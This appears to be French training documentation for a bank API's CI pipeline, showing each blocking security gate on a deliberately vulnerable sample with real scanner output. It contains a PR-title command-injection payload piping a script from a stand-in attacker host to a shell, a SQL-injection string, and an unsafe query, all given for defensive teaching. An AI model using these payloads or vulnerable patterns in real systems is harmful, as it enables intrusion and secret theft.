# Gates de sécurité : ce qui bloque, où, et sur quel exemple

Une gate est un contrôle **bloquant** : si elle échoue, le code ne progresse pas. Ce document montre
chacune d'elles sur un cas concret. Les sorties reproduites ici ont été obtenues en exécutant les outils
(Semgrep, gitleaks et zizmor aux versions du dépôt, Trivy 0.71.2 du poste) sur des échantillons volontairement vulnérables, placés hors du dépôt
pour ne pas faire échouer la CI. Chaque exemple peut être rejoué en formation.

## Vue d'ensemble

```
 poste du développeur        pull request / merge request              déploiement
 ───────────────────  ──────────────────────────────────────────  ───────────────────────
  gitleaks (option)    main protégée : aucun push direct             MR GitOps proposée par
  garde-fou agent IA   ├─ tests + couverture >= 80 %                 le bot, fusionnée par
                       ├─ SAST (CodeQL / Semgrep)                    un humain ; Argo CD tire
                       ├─ secrets sur tout l'historique (gitleaks)   l'état désiré ; Pod
                       ├─ SCA + SBOM (Trivy sur le JAR)              Security Admission
                       ├─ IaC : Terraform, manifestes, Dockerfile    « restricted » refuse
                       ├─ image : scan OS + JRE                      tout pod privilégié
                       ├─ DAST : ZAP contre l'app démarrée
                       ├─ sécurité des workflows CI (zizmor)
                       ├─ revue des dépendances ajoutées
                       └─ fusion par un humain uniquement
```

| # | Gate | Outil | Seuil de blocage | GitHub (ce dépôt) | GitLab (labs) |
|---|---|---|---|---|---|
| 0 | Branche `main` protégée | ruleset GitHub / branche protégée GitLab | tout push direct, force-push, suppression | oui | oui |
| 1 | Tests et couverture | Maven, JUnit, JaCoCo | un test rouge, couverture < 80 % | job `app` | `unit-and-integration` |
| 2 | SAST | CodeQL (GitHub), Semgrep (GitLab) | toute alerte de sévérité élevée | `codeql` | `sast` |
| 3 | Secrets | gitleaks, GitLab secret detection, push protection GitHub | tout secret, **y compris dans l'historique** | `secrets` | `secret_detection` |
| 4 | SCA + SBOM | Trivy | HIGH/CRITICAL avec correctif disponible | `app` | `dependencies` |
| 5 | Revue des dépendances | dependency-review-action | dépendance ajoutée vulnérable (HIGH+) ou sous licence GPL/AGPL | `dependency-review` | - |
| 6 | IaC | Trivy config, tflint | MEDIUM et plus | `iac` | `iac` |
| 7 | Image | Trivy image | HIGH/CRITICAL avec correctif disponible | `container` | `container-scan` |
| 8 | DAST | ZAP baseline | toute alerte WARN ou FAIL | `container` | `dast` |
| 9 | Sécurité de la CI | zizmor, CodeQL `actions` | toute alerte (hors suppressions documentées) | `workflows` | - |
| 10 | Promotion en lab | MR GitOps + Argo CD | aucune fusion automatique | - | `gitops:propose` |

Tous les jobs GitHub ci-dessus sont des **vérifications obligatoires** du ruleset de `main` : une PR ne
peut pas être fusionnée tant qu'un seul est rouge ou absent.

---

## Gate 0 — Personne ne pousse sur `main`, seul un humain fusionne

**Règle** : sur GitHub, un ruleset sans aucune exception (pas même l'administrateur) impose la PR,
les vérifications obligatoires à jour avec `main`, la résolution des conversations, un historique
linéaire, et interdit force-push et suppression. Sur GitLab, `terraform/labs/gitlab.tf` protège
`main` en `push_access_level = "no one"` et exige un pipeline vert (un pipeline ignoré par
`[skip ci]` ne compte pas).

**Exemple concret** : la version précédente du pipeline GitLab faisait pousser par un bot le nouveau
tag d'image directement sur `main`. Conséquence : n'importe quel commit applicatif partait en lab sans
qu'un humain ne voie ce qui était déployé. Désormais le job `gitops:propose` pousse une branche
`gitops/<sha>` et ouvre une merge request ; son jeton est de niveau `developer` et **ne peut pas**
fusionner (fusion réservée aux mainteneurs). L'apprenant relit, fusionne, et Argo CD synchronise.

**Et l'agent IA ?** GitHub ne distingue pas un push fait par Alexandre d'un push fait par Claude Code
avec le même jeton. Le ruleset bloque le push direct pour les deux, mais une fusion par `gh pr merge`
serait acceptée. D'où un second verrou, côté agent : `.claude/settings.json` interdit à Claude Code
`git push` vers `main`, les force-push, `gh pr merge`, l'approbation de PR et la suppression des
rulesets. Enfin, le `GITHUB_TOKEN` des workflows est en lecture seule et ne peut pas approuver de PR,
et la fusion automatique est désactivée sur le dépôt.

**Limite assumée** : dépôt à mainteneur unique, donc 0 approbation exigée (GitHub interdit d'approuver
sa propre PR). Dans une équipe, passer à 1 approbation minimum et `require_code_owner_review`
(fichier `.github/CODEOWNERS` déjà en place).

## Gate 1 — Tests et couverture

**Exemple concret** : un développeur modifie `AccountService.transfer` et supprime le contrôle de
solde. `AccountServiceTest.transferRejectsInsufficientFunds` échoue : un virement de 200,01 EUR depuis
le compte de Bruno (solde 200,00 EUR) ne lève plus `InsufficientFundsException` et le solde devient
négatif. S'il supprime aussi le test, la couverture JaCoCo passe sous
80 % et `mvn verify` échoue sur la règle `jacoco:check`. La couverture sert de garde-fou contre la
suppression de tests, pas d'objectif en soi.

## Gate 2 — SAST : injection SQL

Un apprenant ajoute un dépôt JDBC « rapide » :

```java
return st.executeQuery("SELECT * FROM account WHERE owner = '" + owner + "'");
```

Sortie réelle (`semgrep scan --config p/java --error`, Semgrep 1.177.0), code de sortie 1 :

```
   ❯❯❱ java.lang.security.audit.formatted-sql-string.formatted-sql-string
          ❰❰ Blocking ❱❱
          Detected a formatted string in a SQL statement. This could lead to SQL injection if variables in the
          SQL statement are not properly sanitized. Use a prepared statements (java.sql.PreparedStatement)
          instead.
           19┆ return st.executeQuery("SELECT * FROM account WHERE owner = '" + owner + "'");
```

Avec `owner = "x' OR '1'='1"`, la requête renverrait tous les comptes de la banque.
**Correction** : `PreparedStatement` avec paramètre lié (`WHERE owner = ?`). Sur GitHub, CodeQL
(`security-extended`) signale le même défaut par analyse de flux : il suit `owner` depuis le
paramètre HTTP jusqu'à la requête.

## Gate 3 — Secrets : supprimer la clé ne suffit pas

Scénario rejoué : un commit ajoute `aws.access-key=AKIA...` dans `application.properties`, le commit
suivant la retire. Le fichier courant est propre :

```
$ gitleaks dir . --redact
INF no leaks found
```

Mais la clé reste lisible par quiconque clone le dépôt (`git log -p`). Le scan de l'**historique** la
trouve (gitleaks 8.30.1, code de sortie 1) :

```
$ gitleaks git . --redact -v
Secret:      REDACTED
RuleID:      aws-access-token
File:        application.properties
Line:        2
Commit:      e6679d18c2adce6c39610aba9904f82a45bdc0e0
WRN leaks found: 1
```

C'est pourquoi le job `secrets` fait un checkout complet (`fetch-depth: 0`) et que le job GitLab
active `SECRET_DETECTION_HISTORIC_SCAN`. **Remédiation** : révoquer la clé chez le fournisseur
d'abord, réécrire l'historique ensuite ; l'ordre inverse laisse une fenêtre d'exploitation. En amont,
la *push protection* de GitHub (activée sur ce dépôt) refuse le push lui-même pour les formats de
secrets connus.

## Gate 4 — SCA : Log4Shell dans une dépendance

Un apprenant ajoute `log4j-core` 2.14.1 « pour les logs ». Sortie réelle
(`trivy rootfs --offline-scan --severity CRITICAL --ignore-unfixed --exit-code 1`, Trivy 0.71.2 en local ; la CI utilise 0.74.0) :

```
Total: 2 (CRITICAL: 2)
│ org.apache.logging.log4j:log4j-core │ CVE-2021-44228 │ CRITICAL │ fixed │ 2.14.1 │ 2.15.0, 2.3.1, 2.12.2 │ Remote code execution in Log4j 2.x when logs
│                                     │ CVE-2021-45046 │          │       │        │ 2.16.0, 2.12.2        │ DoS in log4j 2.x with thread context message
```

Le cas réel de ce dépôt est encore plus parlant : le **Tomcat embarqué par la toute dernière version
de Spring Boot** portait 3 CVE critiques ; la gate l'a bloqué dès la première construction (détail et
remédiation dans [`journal-securite.md`](journal-securite.md)). « Dernière version » ne veut pas dire
« sans vulnérabilité connue ».

Le SBOM CycloneDX produit au même moment (artefact `app-reports`) permet, le jour où une nouvelle CVE
sort, de répondre en une recherche à la question « sommes-nous concernés, et où ? ».

## Gate 5 — Revue des dépendances d'une PR

`dependency-review-action` compare les dépendances de la PR à celles de `main` et refuse l'ajout
d'une dépendance vulnérable (HIGH et plus) ou sous licence GPL/AGPL. **Exemple** : une PR Dependabot
ou humaine qui ajouterait une bibliothèque AGPL dans l'API bancaire est bloquée avant la fusion ;
c'est un risque juridique (obligation de publier le code source du service) autant que technique.

## Gate 6 — IaC : un pod privilégié, un Dockerfile root

Manifeste Kubernetes avec `securityContext: { privileged: true }`. Sortie réelle
(`trivy config --severity HIGH,CRITICAL`), code de sortie 1 :

```
Failures: 3 (HIGH: 3, CRITICAL: 0)
KSV-0014 (HIGH): Container 'app' of Deployment 'bank-api' should set 'securityContext.readOnlyRootFilesystem' to true
KSV-0017 (HIGH): Container 'app' of Deployment 'bank-api' should set 'securityContext.privileged' to false
KSV-0118 (HIGH): deployment bank-api in default namespace is using the default security context, which allows root privileges
```

Un conteneur privilégié a accès aux périphériques de l'hôte : une faille applicative devient une
compromission du nœud, donc des autres apprenants. Même si le scan était contourné, le namespace
en Pod Security Admission `restricted` refuserait le pod à l'admission (défense en profondeur).

Dockerfile sans `USER` et avec une image `latest`, sortie réelle :

```
Failures: 2 (MEDIUM: 1, HIGH: 1, CRITICAL: 0)
DS-0001 (MEDIUM): Specify a tag in the 'FROM' statement for image 'eclipse-temurin'
DS-0002 (HIGH): Specify at least 1 USER command in Dockerfile with non-root user as argument
```

Le Dockerfile du dépôt passe ces contrôles : image `25-jre-noble` épinglée, `USER 10001:0`.
La gate scanne les overlays Kustomize **rendus**, c'est-à-dire ce qui sera réellement appliqué.

## Gate 7 — Scan de l'image

Le scan des dépendances Java ne voit pas le système : OpenSSL, glibc, le JRE lui-même. Le job
`container` construit l'image et la scanne entière. **Exemple typique** : une CVE OpenSSL corrigée
dans Ubuntu Noble mais pas encore dans l'image de base téléchargée ; la gate bloque jusqu'à la
reconstruction sur l'image de base corrigée (d'où Dependabot sur l'écosystème `docker`).

## Gate 8 — DAST : l'application attaquée en boîte noire

Dans la CI GitHub, l'API démarre réellement (non-root, système de fichiers en lecture seule, toutes
capacités retirées) et ZAP baseline l'analyse. **Exemple réel** : sans le filtre
`SecurityHeadersFilter`, ZAP lève des alertes WARN (`X-Content-Type-Options` absent, pas de
`Content-Security-Policy`, contenu mis en cache) et le job échoue. Ce filtre a été écrit pour
satisfaire cette gate ; le rapport HTML est publié en artefact `dast-report` à chaque exécution.

## Gate 9 — La CI est elle-même une cible

Un workflow d'accueil des contributeurs, écrit en toute bonne foi :

```yaml
on: pull_request_target
...
      - run: echo "Merci pour la PR ${{ github.event.pull_request.title }}"
```

Un attaquant ouvre une PR intitulée `"; curl https://evil.example/x.sh | sh; echo "` : le titre est
injecté dans le script, exécuté avec les secrets du dépôt. Sortie réelle de zizmor 1.30.1 (code de
sortie 14) :

```
error[dangerous-triggers]: use of fundamentally insecure workflow trigger
error[template-injection]: code injection via template expansion
error[unpinned-uses]: unpinned action reference
warning[excessive-permissions]: overly broad permissions
help[artipacked]: credential persistence through GitHub Actions artifacts
```

**Cas réel sur ce dépôt** : zizmor a bloqué la première version de `.github/dependabot.yml`, faute de
délai de carence ; voir le journal. Les actions sont épinglées par SHA de commit (un tag peut être
déplacé par un attaquant qui compromet l'action, cf. `tj-actions/changed-files` en mars 2025) et les
images d'outils par digest.

## Gate 10 — La promotion est une décision humaine

Après un pipeline vert sur `main`, le bot ouvre la MR « Déployer bank-api `<sha>` en lab », avec le
lien du pipeline qui a scanné l'image. **Exemple** : le formateur introduit une régression fonctionnelle
qui passe tous les scanners ; l'apprenant la repère en relisant la MR (ou en testant l'image), ne
fusionne pas, et le lab reste sur la version précédente. Rollback : `git revert` du commit GitOps, via
une nouvelle MR ; Argo CD revient à l'image antérieure.

---

## Exceptions

Une gate n'est jamais désactivée : une exception est ciblée (un identifiant de règle), justifiée,
datée, assortie d'une mesure compensatoire et consignée dans `docs/journal-securite.md`. Exemple :
`KSV-0125` dans `.trivyignore`.

## Rejouer les exemples en formation

| Exemple | Lab du programme | Durée |
|---|---|---|
| Push direct refusé, MR obligatoire | Lab 2 (premier pipeline) | 10 min |
| Injection SQL, puis `PreparedStatement` | Lab 3 | 20 min |
| Clé AWS commitée puis retirée, trouvée dans l'historique | Lab 3 | 20 min |
| Ajout de log4j 2.14.1, lecture du SBOM | Lab 4 | 20 min |
| Pod privilégié refusé par le scan puis par l'admission | Lab 9 | 20 min |
| Workflow vulnérable à l'injection de titre de PR | Démonstration jour 2 | 15 min |
| Régression non détectée par les outils, bloquée à la relecture de la MR GitOps | Lab 8 | 20 min |
